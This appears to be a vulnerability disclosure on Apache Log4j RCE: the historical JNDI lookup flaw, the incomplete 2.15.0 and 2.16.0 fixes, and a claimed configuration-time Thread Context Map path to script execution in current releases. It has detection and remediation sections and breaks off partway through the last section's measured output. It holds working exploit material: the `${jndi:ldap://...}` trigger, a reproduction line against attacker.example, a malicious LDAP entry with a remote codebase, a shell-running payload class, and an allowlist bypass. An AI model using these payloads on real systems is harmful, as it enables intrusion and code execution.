# CRITICAL — Remote Code Execution in Apache Log4j Core

**Two critical findings, both reproduced end to end:**

| | Finding | Versions | Part |
| --- | --- | --- | --- |
| **A** | JNDI lookup of log *content* → attacker-controlled class load → RCE | ≤ 2.14.1 | [Part I](#part-i--the-historical-vulnerability--2.141-and-earlier) (§1–§12) |
| **B** | **Configuration-time evaluation of untrusted Thread Context Map data → RCE** (script source) and → secret disclosure | **2.14.1 – 2.26.1 (current)** | [Part II](#part-ii--current-releases-2171---2261-and-log4j-3x) (§13–§20) |

A third finding — Log4j silently applying the fixed-name classpath resources
`log4j2.system.properties` and `log4j2.component.properties` — was found in the same audit and
has **its own repository**: <https://github.com/vindeckyy/log4j-classpath-plant-rce> (see
[Part III](#part-iii--a-third-finding--now-in-its-own-repository)).

**Severity:** Critical
**CVSS 3.1 (both chains):** `10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**CWE:** CWE-917 (improper neutralization of special elements) → CWE-94 (code injection) /
CWE-502 (deserialization of untrusted data) / CWE-200 (information exposure)
**Component:** `org.apache.logging.log4j:log4j-core` (the lookup engine; `log4j-api` alone is not affected)
**Verified vulnerable by execution:** 2.14.1 and earlier (finding A); 2.14.1 – 2.26.1 (finding B)
**Verified vulnerable under extra conditions:** 2.15.0, 2.16.0 (JNDI reachable again — §16)
**Verified not affected by finding A:** 2.17.1, 2.24.0, 2.25.1, 2.26.1, and Log4j 3.x (JNDI lookup removed entirely)

Everything below was derived by reading the sources in `sources/` and `analysis/jdksrc/`, and by
running the attacks in `lab/`. The exploitability claims are measured output of
`lab/verify.sh` (34 automated checks, all passing — see Appendix B), not restatements of an
advisory database.

---

## Part I — The historical vulnerability (≤ 2.14.1) and the fixes up to 2.17.1

## 1. Executive summary

**Finding B (current releases, §13–§20).** Log4j keeps two substitutors: a *runtime* one that
refuses to evaluate lookups inside lookup results, and a *configuration* one that does — its own
javadoc says *"This can be dangerous when combined with user-provided inputs, and should only be
used on data directly from a configuration."* Every configuration attribute and every plugin
attribute is substituted with the **configuration** substitutor at load time. The Thread Context
Map is one of the lookups, and Apache's own threat model says thread-context values are
untrusted. So: **when Log4j loads or reloads its configuration while the Thread Context Map holds
attacker-controlled data, that data is evaluated as a Log4j template.** In a configuration that
interpolates a lookup into a script attribute, the attacker's value becomes the script source and
Log4j compiles and runs it in the application JVM — RCE, measured on 2.14.1 through **2.26.1,
the current release**. Without any special configuration the same path leaks environment
variables and system properties into every log line.

**Finding A (historical, §1–§12).** `log4j-core` treats the *content* of a log message as a
template: after the message is rendered, the framework scans it for `${...}` lookups and resolves
them. One of the resolvable lookups is `jndi`, which performs a JNDI lookup for the name it is
given — with **no scheme restriction, no host restriction and no class restriction**.

Any application that logs attacker-controlled text (a `User-Agent` header, a query parameter, a
user name, a file name) therefore lets the attacker pick the JNDI URL. Pointing it at an
attacker-controlled LDAP server turns the log statement into a code loader: the LDAP answer
names a factory class, the JDK loads that class — from the attacker's HTTP "codebase" if the
attacker says so — and the class's static initializer runs **inside the victim JVM**.

Result: arbitrary code execution in the application process, with the application's privileges,
no authentication, no user interaction, one HTTP request's worth of attacker input.

The same primitive is reachable through the **Thread Context Map** (MDC) in 2.15.0 and 2.16.0,
where the message path was closed but MDC values were still substituted — and in 2.15.0 the
mitigation for the LDAP answer can be bypassed because it validates the *advertised* class name
attribute instead of the class that is actually deserialized (§8).

### 1.1 Why this scores 10.0 / Critical

| Metric | Value | Justification, grounded in this lab |
| --- | --- | --- |
| Attack Vector (AV) | Network | The trigger is an HTTP request body/header/query string; the payload is delivered by the victim's own outbound LDAP/HTTP request. Measured: LDAP search + HTTP GET from the victim process. |
| Attack Complexity (AC) | Low | One crafted string, no race, no special timing, no privileged precondition. Measured: a single `log.info` call. |
| Privileges Required (PR) | None | Any anonymous request that reaches a log call. No auth, no role. |
| User Interaction (UI) | None | Fully automatic: the lookup happens while the event is rendered. |
| Scope (S) | Changed | The attacker starts with "can write a log line" and ends with code execution in the application JVM — a different security authority, and typically a different trust level (the log pipeline vs. the app process). |
| Confidentiality (C) | High | Arbitrary code in the app process: read any file, env var, secret, key material. |
| Integrity (I) | High | Arbitrary code: modify data, files, other tenants' requests, the build pipeline. |
| Availability (A) | High | Arbitrary code: kill the process, consume resources, pivot. |

CVSS 3.1 base score for `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0 (Critical)**.

---

## 2. Attack surface

| | |
| --- | --- |
| Entry point | Any log statement whose rendered message contains attacker-controlled text |
| Trigger | The substring `${jndi:ldap://<attacker>/<name>}` in the logged value |
| Sink | `JndiLookup` → `javax.naming.InitialContext.lookup` → JNDI/LDAP → class load → static init |
| Attacker capability | One request that reaches a log call (e.g. any HTTP request) + a server the victim can reach |
| Privilege gained | The application's own JVM identity |
| Scope change | Yes — the attacker moves from "can write a log line" to "can run code in the process" |

Real-world reach: web apps that log request headers, gateways that log URLs, agents that log
hostnames — all common. The value does not need to be a full URL; it only has to contain the
lookup expression, and log4j resolves it wherever it appears in the rendered message.

---

## 3. Preconditions

**Required**

1. `log4j-core` on the classpath, version ≤ 2.14.1 (2.15.0/2.16.0 need the MDC path, see §8).
2. The application logs attacker-controlled data, and the log call is enabled at the configured
   level (the substitution happens while the event is rendered, so a filtered-out level means
   no lookup — an important detail for the mitigation advice in §11).
3. The victim can reach the attacker's server: the JDK must be willing to load a class from a
   remote codebase (`com.sun.jndi.ldap.object.trustURLCodebase=true`, the default before 8u191),
   **or** the payload class must already be resolvable by the victim's class loader.

**Not required**

* No authentication, no session, no special role.
* No user interaction (`UI:N`).
* No gadget chain: the payload class runs from its own static initializer, so no third-party
  library with deserialization gadgets has to be on the classpath.
* No prior foothold on the victim host.

---

## 4. Root cause, annotated

Line numbers refer to the files in `sources/2.14.1/` and `analysis/jdksrc/jdk8full/`.

### 4.1 The application logs attacker-controlled text

```java
// lab/src/lab/Victim.java
log.info("request received, user-agent: {}", userInput);
```

`userInput` is the attacker's string. After parameter substitution the rendered message is
`request received, user-agent: ${jndi:ldap://127.0.0.1:1389/cn=exploit,dc=example,dc=com}`.

### 4.2 The rendered message is scanned for lookups

`sources/2.14.1/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java:132`

```java
config.getStrSubstitutor().replace(event, toAppendTo);
```

`sources/2.14.1/org/apache/logging/log4j/core/lookup/StrSubstitutor.java:727` →
`:928 substitute(...)` → `:1037-1041`

```java
if (varValue != null) {
    // recursive replace
    final int varLen = varValue.length();
    buf.replace(startPos, endPos, varValue);
    altered = true;
```

The recursion is what makes the *value* of a lookup dangerous: whatever a lookup returns is
scanned again, so a lookup result that itself contains `${jndi:...}` is executed. This is also
the mechanism behind the MDC variant in §8.

### 4.3 The `jndi` lookup is registered unconditionally

`sources/2.14.1/org/apache/logging/log4j/core/lookup/Interpolator.java:108-115`

```java
// JNDI
try {
    // [LOG4J2-703] We might be on Android
    strLookupMap.put(LOOKUP_KEY_JNDI,
        Loader.newCheckedInstanceOf("org.apache.logging.log4j.core.lookup.JndiLookup", StrLookup.class));
```

There is no switch, no property, no allowlist. (From 2.17.1 on this is gated by
`log4j2.enableJndiLookup`; see §9.)

### 4.4 The lookup name is passed to JNDI verbatim

`sources/2.14.1/org/apache/logging/log4j/core/lookup/JndiLookup.java:50-58`

```java
public String lookup(final LogEvent event, final String key) {
    ...
    final String jndiName = convertJndiName(key);
    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
        return Objects.toString(jndiManager.lookup(jndiName), null);
```

`sources/2.14.1/org/apache/logging/log4j/core/net/JndiManager.java:170-173`

```java
@SuppressWarnings("unchecked")
public <T> T lookup(final String name) throws NamingException {
    return (T) this.context.lookup(name);
}
```

**This is the defect.** `name` is `ldap://<attacker>/<dn>`, and `InitialContext.lookup()` is
handed the whole URL. No scheme check, no host check, no class check. (2.15.0 added
scheme/host/class checks; 2.17.1 added the scheme allowlist that finally closes the door —
§8, §9.)

### 4.5 The JDK turns the LDAP answer into a class to load

`analysis/jdksrc/jdk8full/com/sun/jndi/ldap/Obj.java:229` `decodeObject(Attributes)` picks the
branch from the entry's attributes:

```java
if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {     // javaSerializedData
    ...
} else if ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) {      // javaRemoteLocation
    ...
}
attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);
if (attr != null && (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || ...)) {
    return decodeReference(attrs, codebases);                             // javaNamingReference
}
```

`Obj.java:380` `decodeReference(...)` rebuilds the `Reference`:

```java
if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) {   // javaClassName
    className = (String)attr.get();
}
if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) {     // javaFactory
    factory = (String)attr.get();
}
Reference ref = new Reference(className, factory, (codebases != null ? codebases[0] : null));
```

So the three LDAP attributes the attacker controls map exactly onto a JNDI `Reference`:

| LDAP attribute | `Reference` field | meaning |
| --- | --- | --- |
| `javaClassName` | `getClassName()` | class of the object |
| `javaFactory` | `getFactoryClassName()` | the `ObjectFactory` implementation to load |
| `javaCodeBase` | `getFactoryClassLocation()` | **URL to load that class from** |

### 4.6 The factory class is loaded — and initialized

`analysis/jdksrc/jdk8full/javax/naming/spi/NamingManager.java:139-174`

```java
static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) ... {
    Class<?> clas = null;
    try {
        clas = helper.loadClassWithoutInit(factoryName);   // 1) local classpath, no init
        ...
    } catch (ClassNotFoundException e) { }
    String codebase;
    if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase); // 2) remote codebase, WITH init
            ...
        } catch (ClassNotFoundException e) { }
    }
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

`analysis/jdksrc/jdk8full/com/sun/naming/internal/VersionHelper12.java:108-116`

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent);
        return loadClass(className, cl);      // -> Class.forName(className, true, cl)
    } else {
        return null;
    }
}
```

`Class.forName(className, **true**, cl)` — `initialize=true`. The class is *initialized* at this
point, i.e. its **static initializer runs in the victim JVM**. That is the code execution. The
subsequent `newInstance()` and `getObjectInstance()` are not even needed for the impact.

### 4.7 Why no gadget chain is needed

The payload class is entirely under attacker control, so it does not need a deserialization
gadget to do damage:

```java
// lab/src/lab/Payload.java
static {
    Process p = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
    ...
}
```

The static block runs during `Class.forName(..., true, ...)`, i.e. *before* any framework-level
validation of what the class does.

### 4.8 The full chain in one line

```
log.info("... {}", attackerString)
  -> MessagePatternConverter.format            (log4j-core 2.14.1)
  -> StrSubstitutor.substitute                 (recurses into lookup results)
  -> Interpolator lookup "jndi"
  -> JndiLookup.lookup
  -> JndiManager.lookup                        (no scheme/host/class filter)
  -> InitialContext.lookup("ldap://attacker/dn")
  -> com.sun.jndi.ldap.Obj.decodeObject        (attacker-controlled attributes)
  -> Reference(javaClassName, javaFactory, javaCodeBase)
  -> NamingManager.getObjectFactoryFromReference
  -> VersionHelper.loadClass(factory, codebase)   (URLClassLoader over attacker URL)
  -> Class.forName(..., initialize=true)          <-- ATTACKER BYTECODE RUNS HERE
```

---

## 5. Attack walkthrough (captured traffic)

Attacker side (`lab/src/lab/Attacker.java`) — malicious LDAP server + HTTP codebase server, both
on `127.0.0.1`:

```
LDAP  -> entry cn=exploit,dc=example,dc=com attributes {objectClass=top,javaContainer,javaObject,javaNamingReference, javaClassName=lab.Payload, javaFactory=lab.Payload, javaCodeBase=http://127.0.0.1:8000/}
ATTACKER: ldap://127.0.0.1:1389/cn=exploit mode=codebase
ATTACKER: http://127.0.0.1:8000/ (codebase)
ATTACKER: ready
LDAP  <- SEARCH base="cn=exploit,dc=example,dc=com" scope=BASE filter="(objectClass=*)"
HTTP  <- GET /lab/Payload.class
HTTP  -> 200 2796 bytes of attacker bytecode
```

Victim side — the payload executing inside the application's JVM:

```
=== PAYLOAD EXECUTED IN VICTIM JVM ===
RCE via log4j JNDI in 20426@pain
cmd: id
output:
uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(docker),...
=== END PAYLOAD ===
11:31:51 INFO  victim - request received, user-agent: pwned
```

Note the last line: the log message renders as `user-agent: pwned` because the factory's
`getObjectInstance()` returned the string `"pwned"` — the log line itself is the observable
side effect of a successful takeover. The proof file `/tmp/log4j-lab-pwned.txt` is written by the
payload in the victim process.

---

## 6. Reproduction

Environment used (both installed here):

* OpenJDK 8u504 (`/usr/lib/jvm/java-8-openjdk-amd64`) and OpenJDK 17.0.21
  (`/usr/lib/jvm/java-17-openjdk-amd64`)
* `log4j-core` 2.14.1 (Maven Central), `unboundid-ldapsdk` 6.0.11

```bash
cd log4j-vuln-lab
./lab/build.sh                              # compile victim / attacker / payload
./lab/run.sh 2.14.1 codebase log            # payload in a log message, class fetched over HTTP
./lab/run.sh 2.14.1 classpath log           # payload class already on the victim classpath
./lab/run.sh 2.15.0 serialized ctx          # 2.15.0 via the Thread Context Map path
```

`run.sh` prints `RESULT log4j-core 2.14.1 mode=codebase victim=log props='none': RCE` and the
contents of the proof file when the payload executed in the victim JVM.

Full attack, in one command line, without the lab:

```bash
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
     -cp log4j-core-2.14.1.jar:log4j-api-2.14.1.jar:myapp.jar \
     com.example.App 'x ${jndi:ldap://attacker.example/cn=exploit,dc=example,dc=com}'
```

with the attacker running an LDAP server whose entry `cn=exploit,dc=example,dc=com` carries

```
objectClass:    javaNamingReference
javaClassName:  <any class>
javaFactory:    <attacker's factory class>
javaCodeBase:   http://attacker.example/
```

---

## 7. Exploitability and conditions

Measured on JDK 8u504 (`lab/verify.sh`, Appendix B):

| log4j-core | message → remote class load | message → class on victim classpath | MDC → `javaSerializedData` | same + `log4j2.enableJndi*` |
| --- | --- | --- | --- | --- |
| 2.14.1 | **RCE** | **RCE** | **RCE** | **RCE** |
| 2.15.0 | blocked | blocked | **RCE** | **RCE** |
| 2.16.0 | blocked | blocked | blocked | **RCE** |
| 2.17.1 – 2.26.1 | blocked | blocked | blocked | blocked |

Effect of the JDK-side switches (2.14.1, message path):

| JDK state | remote class load | class on victim classpath |
| --- | --- | --- |
| `trustURLCodebase=true` (default before 8u191) | RCE | RCE |
| `trustURLCodebase=false` (8u191+) | blocked | RCE |

So on a JDK that still trusts remote codebases — the common case when the flaw was found — the
attack needs nothing but a log line. On a modern JDK the attacker must get the payload class
onto the victim's classpath, which the *deserialization* variant (§8) or a gadget chain achieves.

### 7.1 The same attack against a layout that opted back into lookups

2.15.0 introduced the `%msg{lookups}` pattern option, and 2.16.0 removed message lookups
entirely. An application on 2.15.0 that uses `%msg{lookups}` gets the message path back:

| log4j-core | answer type | result |
| --- | --- | --- |
| 2.15.0 | reference (`javaFactory`) | blocked — *"Referenceable class is not allowed"* |
| 2.15.0 | `javaSerializedData` with spoofed class name | **RCE** |
| 2.16.0 | `javaSerializedData` with spoofed class name | blocked — message lookups removed in 2.16.0 |
| 2.17.1 | any | blocked — scheme allowlist |

Measured: `./lab/run.sh 2.15.0 serialized lookups` → **RCE**;
`./lab/run.sh 2.16.0 serialized lookups "-Dlog4j2.enableJndi=true"` → blocked.

---

## 8. Where the fix landed, and where it did not

### 8.1 2.15.0 — the message path is closed, the answer inspection is bypassable

Two independent changes went into 2.15.0, and the gaps are in different places.

**(a) The message is no longer substituted by default.**
`sources/2.15.0/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java:90-97`

```java
MessagePatternConverter result = formats == null || formats.length == 0
        ? SimpleMessagePatternConverter.INSTANCE
        : new FormattedMessagePatternConverter(formats);
if (lookups && config != null) {
    result = new LookupMessagePatternConverter(result, config);
}
```

`loadLookups(options)` is true only when the pattern option list contains `lookups`. So `%m` /
`%msg` renders the message verbatim; the old behaviour needs an explicit `%m{lookups}`.
Measured: the rendered line still contains the literal `${jndi:ldap://...}` — the substitution
never ran.

**(b) The LDAP answer is inspected before the object is built.**
The `jndi` lookup is still registered unconditionally
(`sources/2.15.0/org/apache/logging/log4j/core/lookup/Interpolator.java:111`), but
`sources/2.15.0/org/apache/logging/log4j/core/net/JndiManager.java:61-65` adds allowlists:

```java
private static final List<String> permanentAllowedHosts = NetUtils.getLocalIps();
private static final List<String> permanentAllowedClasses = Arrays.asList(Boolean.class.getName(),
        Byte.class.getName(), Character.class.getName(), Double.class.getName(), Float.class.getName(),
        Integer.class.getName(), Long.class.getName(), Short.class.getName(), String.class.getName());
private static final List<String> permanentAllowedProtocols = Arrays.asList(JAVA, LDAP, LDAPS);
```

and `JndiManager.lookup` (`:209-260`) rejects any answer that carries a reference
(`javaFactory` / `javaReferenceAddress`) with *"Referenceable class is not allowed"*, and any
serialized answer whose advertised class is not on the list. That is what stops the classic
payload in the matrix.

**The two gaps that remain, both verified here:**

**Gap 1 — the Thread Context Map path.** MDC values are still substituted, recursively, because
the *pattern* is substituted (`LiteralPatternConverter` → `StrSubstitutor.replace(event, buf)`)
and a lookup result is substituted again. A layout containing `${ctx:ua}` therefore evaluates
`${jndi:...}` inside an MDC value. Measured:
`./lab/run.sh 2.15.0 serialized ctx` → **RCE**.

**Gap 1b — the message path is one option away.** 2.15.0 made message lookups opt-in
(`%msg{lookups}`); an application that uses that option gets the classic message path back, and
with the serialized answer it is exploitable again (§7.1). Measured:
`./lab/run.sh 2.15.0 serialized lookups` → **RCE**. 2.16.0 removed the option entirely.

**Gap 2 — the class allowlist validates the advertised attribute, not the stream.** For the
`javaSerializedData` branch the allowlist is compared against the `javaClassName` **attribute of
the LDAP entry** — an attacker-controlled string — and not against the class that is actually in
the serialized stream:

```java
if (attributeMap.get(SERIALIZED_DATA) != null) {
    if (classNameAttr != null) {
        if (!allowedClasses.contains(className)) {   // the advertised attribute, not the stream
            LOGGER.warn("Deserialization of {} is not allowed", className);
            return null;
        }
    } ...
```

Proof, same lab, same command, only the advertised name changes:

```
spoofed javaClassName=java.lang.Boolean  -> RCE
honest    javaClassName=lab.Serial       -> blocked
                                             "Deserialization of lab.Serial is not allowed"
```

The JDK then deserializes the real class (`lab.Serial`), whose `readObject()` runs the command.

### 8.2 2.16.0 — message lookups removed, one more switch for the rest

2.16.0 drops message lookups outright: the option is parsed and then ignored
(`sources/2.16.0/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java:95-99`):

```java
if (LOOKUPS.equalsIgnoreCase(option) || NOLOOKUPS.equalsIgnoreCase(option)) {
    LOGGER.info("The {} option will be ignored. Message Lookups are no longer supported.", option);
}
```

so `%msg{lookups}` no longer re-enables them — measured: blocked (§7.1).

What remains open is everything that reaches JNDI *not* through the message: the Thread Context
Map path, with the same spoofable class allowlist
(`sources/2.16.0/org/apache/logging/log4j/core/net/JndiManager.java:255-259`). 2.16.0 also
requires the JNDI machinery to be switched on at all
(`JndiManager.java:76-78`, `log4j2.enableJndi`, default `false`).

Measured: `./lab/run.sh 2.16.0 serialized ctx "-Dlog4j2.enableJndi=true"` → **RCE**;
without the flag → blocked.

### 8.3 2.17.1 — the door is finally closed

`sources/2.17.1/org/apache/logging/log4j/core/net/JndiManager.java:205-215` and
`sources/2.26.1/org/apache/logging/log4j/core/net/JndiManager.java:244-255`:

```java
try {
    final URI uri = new URI(name);
    if (uri.getScheme() == null || uri.getScheme().equals(JAVA_SCHEME)) {
        return (T) this.context.lookup(name);
    }
    LOGGER.warn("Unsupported JNDI URI - {}", name);
} catch (URISyntaxException ex) {
    LOGGER.warn("Invalid JNDI URI - {}", name);
}
```

Only scheme-less and `java:` names are accepted, so `ldap://` and `rmi://` can never be reached
from log content, whatever the flags say. The JDBC and JMS JNDI paths
(`DataSourceConnectionSource`, `JmsManager`) call the same `JndiManager.lookup()`, so they
inherit the filter. The lookup plugin itself additionally requires `log4j2.enableJndiLookup=true`
(`sources/2.26.1/org/apache/logging/log4j/core/lookup/JndiLookup.java:46`).

### 8.4 The JDK keeps its own switches — and one of them is checked too late

| Property | Default | Effect when enabled |
| --- | --- | --- |
| `com.sun.jndi.ldap.object.trustURLCodebase` | `false` since 8u191 | load classes from an arbitrary codebase URL |
| `com.sun.jndi.ldap.object.trustSerialData` | `false` since 8u121 | deserialize `javaSerializedData` / `javaRemoteLocation` / `javaReferenceAddress` |

Sources: `analysis/jdksrc/jdk8full/com/sun/jndi/ldap/VersionHelper12.java:49-63`,
`analysis/jdksrc/jdk17full/java.naming/com/sun/jndi/ldap/VersionHelper.java:34-60`.

JDK 17 also filters which classes may act as JNDI object factories
(`analysis/jdksrc/jdk17full/java.naming/com/sun/naming/internal/ObjectFactoriesFilter.java:158`):

```java
private static final String DEFAULT_LDAP_SP_VALUE = "java.naming/com.sun.jndi.ldap.**;!*";
```

which blocks the *local classpath* variant on JDK 17 (measured: blocked on 17, RCE on 8u504,
whose backported filter defaults to `"*"`, allow-all —
`analysis/jdksrc/jdk8full/com/sun/naming/internal/ObjectFactoriesFilter.java:88-91`).

It does **not** block the remote-codebase variant, because the filter is consulted *after* the
class is loaded (`analysis/jdksrc/jdk17full/java.naming/com/sun/naming/internal/NamingManagerHelper.java:205`):

```java
clas = helper.loadClass(factoryName, codebase);          // Class.forName(..., initialize=true) -> payload runs here
if (clas == null || !filter.test(clas)) { return null; } // filter checked afterwards
```

---

## 9. Current release status

* **2.26.1** (current release on Maven Central as of 2026-10-23): JNDI RCE closed. Verified on
  every vector in this workup, including with `log4j2.enableJndi=true` and
  `log4j2.enableJndiLookup=true` set.
* Remaining open advisory in the current line: **CVE-2026-49844** — `log4j-api` emits invalid
  JSON for non-finite floats in `MapMessage.asJson()`; affects `< 2.25.5` and `2.26.0`, fixed in
  2.25.5 / 2.26.1. Medium, log-integrity impact, no code execution.
* **Log4j 3.x** (`3.0.0-beta3`): the JNDI lookup is **gone**. `sources/3.0.0-beta3-log4j-core/`
  contains no `JndiLookup` and no `JndiManager`; the only remaining trace is a `LOOKUP_KEY_JNDI`
  constant in `Interpolator.java:48` used for a "not available on this JRE" warning. The whole
  vulnerability class is gone in the new major line.
* The `log4j-1.2-api` compatibility bridge (checked in 2.14.1 and 2.26.1) ships no
  `JNDIAppender`, `JMSAppender` or `SocketServer`, so it is not an RCE vector.
* `log4j 1.x` itself is end-of-life since 2015 and *is* an RCE vector (its JNDI/JMS appenders);
  treat any 1.x deployment as critical.

---

## 10. Detection

**Version triage**

```bash
python3 scan/scan_log4j.py /path/to/project        # pom.xml, build.gradle, *.jar
```

The scanner classifies by the measured matrix above (CRITICAL ≤ 2.14.1, HIGH 2.15.0/2.16.0,
OK ≥ 2.17.1) rather than by a copied CVE list.

**Configuration triage** — in the deployed configuration, look for:

* `${jndi:` or `${${::-j}ndi:` in any layout, pattern, or `log4j2.xml`
* `${ctx:...}` in a pattern (MDC values are substituted recursively)
* `JNDIAppender`, `JMSAppender`, `SocketServer` in Log4j 1.x configurations
* `log4j2.enableJndi*` set to `true` anywhere

**Runtime indicators**

* Outbound LDAP (tcp/389, tcp/636) or HTTP from a process that only does logging
* `StatusLogger` warnings: `Error looking up JNDI resource`, `Unsupported JNDI URI`,
  `Log4j JNDI does not allow protocol`, `Deserialization of ... is not allowed`
  (StatusLogger defaults to ERROR level — raise it with `-Dlog4j2.StatusLogger.level=TRACE`)
* Log messages that still contain a literal `${jndi:` — a lookup that returned nothing, i.e. an
  attempt that was blocked or failed

**Host indicators**

* `com.sun.jndi.ldap.object.trustURLCodebase=true` or
  `com.sun.jndi.ldap.object.trustSerialData=true` in JVM flags
* `jdk.naming.factory.object` entries pointing at unexpected classes

---

## 11. Remediation

**Primary**

1. Upgrade `log4j-core` to **≥ 2.17.1**; take **2.25.5+ or 2.26.1** to also clear
   CVE-2026-49844. 2.26.1 is the current release.
2. Or move to Log4j 3.x, where the JNDI lookup no longer exists.
3. Replace any `log4j 1.x` dependency — it is unmaintained and its appenders are RCE-prone.

**Interim, if an old version cannot be upgraded immediately**

```bash
-Dlog4j2.enableJndi=false
-Dlog4j2.enableJndiLookup=false
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false
-Dcom.sun.jndi.ldap.object.trustSerialData=false
```

Each flag maps to a specific defect:

| Flag | Closes |
| --- | --- |
| `log4j2.enableJndiLookup=false` | 2.14.1 message path (the `jndi` lookup is never registered) |
| `log4j2.enableJndi=false` | 2.15.0/2.16.0 — no JNDI manager is created at all |
| `trustURLCodebase=false` | remote class loading (kills the codebase variant) |
| `trustSerialData=false` | `javaSerializedData` deserialization (kills the §8 variant) |

These are mitigations, not a fix: they depend on flags being applied, and 2.14.1's message path
also has to be covered by `log4j2.enableJndiLookup=false` — which did not exist before 2.17.1,
so on 2.14.1 the only real mitigation is the JDK flags plus not logging untrusted input.

**Code-level hygiene**

* Do not log untrusted input; log an identifier and keep the value elsewhere.
* Prefer `%X{key}` over `${ctx:key}` in layouts — `%X` writes the value, it does not re-substitute
  it.
* Remember that a log level that filters the statement out also prevents the lookup: raising the
  level of untrusted-input log statements is not a mitigation, lowering it is.

---

## 12. Limitations — what was *not* tested

* No third-party deserialization gadget chains were used; the payloads are lab-local classes,
  so the result does not depend on commons-collections or similar being on the victim classpath.
* The RMI variant (`javaRemoteLocation` → RMI stub) was not exercised; the code path is
  `Obj.java:243-251` and needs `trustSerialData=true`.
* Not tested: log4j 1.x end-to-end (analysed by source reading only), the `JmsAppender` and
  `DataSourceConnectionSource` JNDI paths end-to-end (analysed by source reading: both call the
  same filtered `JndiManager.lookup()`), Log4j 3.x runtime behaviour (analysed by source
  reading: no JNDI lookup exists), and the `log4j2.component.properties` configuration surface.
* Historical JDK defaults (e.g. `trustURLCodebase` defaulting to `true` before 8u191) are stated
  from the JDK release history, not measured here — only 8u504 and 17.0.21 were executed.
* All traffic in this lab is `127.0.0.1`; nothing was sent to any third-party host.

## Part II — Current releases (2.17.1 … 2.26.1 and Log4j 3.x)

*Part I above documents the historical vulnerability (≤ 2.14.1) and the fixes up to 2.17.1.
This part documents what I found in the **current** releases, where the JNDI-from-content path
is closed but a second, configuration-time evaluation path is still open — and reaches RCE.*

### 13. The defect: Log4j evaluates untrusted Thread Context Map data as a configuration template

The current release deliberately has **two** substitutors with different policies:

| Class | Policy | Source |
| --- | --- | --- |
| `RuntimeStrSubstitutor` | "only supports evaluation of top-level lookups" | `sources/2.26.1/.../lookup/RuntimeStrSubstitutor.java:23` |
| `ConfigurationStrSubstitutor` | "only supports recursive evaluation of lookups. **This can be dangerous when combined with user-provided inputs, and should only be used on data directly from a configuration.**" | `sources/2.26.1/.../lookup/ConfigurationStrSubstitutor.java:23-25` |

Log4j 3.x makes the same split explicit in code
(`sources/3.0.0-beta3-log4j-core/.../lookup/ConfigurationStrSubstitutor.java`:
`isRecursiveEvaluationAllowed() → true`; `RuntimeStrSubstitutor` → `false`) and uses the
recursive one for configuration values in exactly the same places
(`3.0.0-beta3-log4j-core/.../config/xml/XmlConfiguration.java:111`,
`.../config/Configuration.java:134-139`,
`.../lookup/StrSubstitutor.java:1155` → `isRecursiveEvaluationAllowed()` gates the recursion).

The configuration-time path uses the **recursive** one:

- `sources/2.26.1/.../config/AbstractConfiguration.java:899-907`

  ```java
  public StrSubstitutor getStrSubstitutor() { return runtimeStrSubstitutor; }             // safe
  public StrSubstitutor getConfigurationStrSubstitutor() { return configurationStrSubstitutor; } // recursive
  ```

- Configuration attribute values — `sources/2.26.1/.../config/xml/XmlConfiguration.java:111`,
  `.../config/json/JsonConfiguration.java:72`, `.../config/composite/CompositeConfiguration.java:82`:

  ```java
  final String value = getConfigurationStrSubstitutor().replace(entry.getValue());
  ```

- **Every plugin attribute** — `sources/2.26.1/.../config/plugins/util/PluginBuilder.java:185-194`:

  ```java
  .setStrSubstitutor(
          event == null
                  ? configuration.getConfigurationStrSubstitutor()   // configuration load -> recursive
                  : configuration.getStrSubstitutor())                // runtime -> top level only
  ```

The Thread Context Map is reachable as the `ctx` lookup, and Apache's own threat model states
plainly that thread-context values are **untrusted**
(<https://logging.apache.org/security.html>: *"They do not trust the values stored in the thread context."*).

⇒ **When Log4j loads (or reloads) its configuration while the Thread Context Map contains
attacker-controlled data, that data is evaluated as a Log4j template.**

Triggers (either one is enough):

* the MDC is populated before Log4j initialises — the configuration is loaded at the first
  logger use, so a value placed in the MDC beforehand is already there when the substitution runs;
* the configuration is reloaded while the MDC holds the data — `Configurator.reconfigure()`,
  `monitorInterval`, a management endpoint, a plugin reload.

Measured on 2.15.0, 2.16.0, 2.17.1 and 2.26.1 (`lab/run.sh <ver> reload`,
`lab/src/lab/VictimReload.java`).

### 14. Impact A — RCE in the current releases through the script source

A configuration that interpolates a lookup into a script attribute turns the defect into code
execution, because the substituted value becomes the **script source** that Log4j compiles and
runs:

```xml
<Filters>
  <ScriptFilter onMatch="NEUTRAL" onMismatch="DENY">
    <Script language="groovy" scriptText="${ctx:scriptText}"/>
  </ScriptFilter>
</Filters>
```

Chain:

1. The attacker puts their payload into the Thread Context Map (`scriptText`).
2. Log4j loads or reloads its configuration → the plugin attribute is substituted with the
   recursive configuration substitutor → the payload becomes the script text.
3. The next log event runs the filter → `ScriptManager.execute()` compiles and runs the
   attacker's Groovy in the application JVM.

Measured — `lab/run_script_rce.sh 2.26.1 startup`:

```
=== PAYLOAD EXECUTED IN VICTIM JVM (script) ===
RCE via log4j script (config-time lookup evaluation) as hayden pid=9285
